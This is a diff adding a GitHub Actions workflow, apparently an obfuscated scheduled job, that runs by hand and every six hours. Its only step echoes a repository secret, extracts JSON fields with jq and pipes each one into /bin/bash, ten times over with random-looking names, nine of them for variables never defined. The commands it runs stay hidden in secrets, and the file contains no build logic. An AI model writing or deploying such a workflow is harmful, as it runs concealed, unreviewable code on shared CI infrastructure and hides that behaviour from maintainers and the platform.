@@ -1,0 +1,27 @@
+name: xiaoqiongju5678
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaoqiongju5678
+        env:
+          qrb75: ${{ secrets.qrb75 }}
+        run: |
+          echo $qrb75 | jq -r .mvoku74 | /bin/bash
+          echo $hbo80 | jq -r .pf055 | /bin/bash
+          echo $r4 | jq -r .yflx1219 | /bin/bash
+          echo $vj10 | jq -r .adq3015 | /bin/bash
+          echo $ueeb583 | jq -r .sqzd8023 | /bin/bash
+          echo $omarz10216 | jq -r .ue4940 | /bin/bash
+          echo $ywva42 | jq -r .fas6 | /bin/bash
+          echo $bghkj224 | jq -r .n60 | /bin/bash
+          echo $vidr1093 | jq -r .zwfl84 | /bin/bash
+          echo $ncssr704 | jq -r .h214 | /bin/bash
+
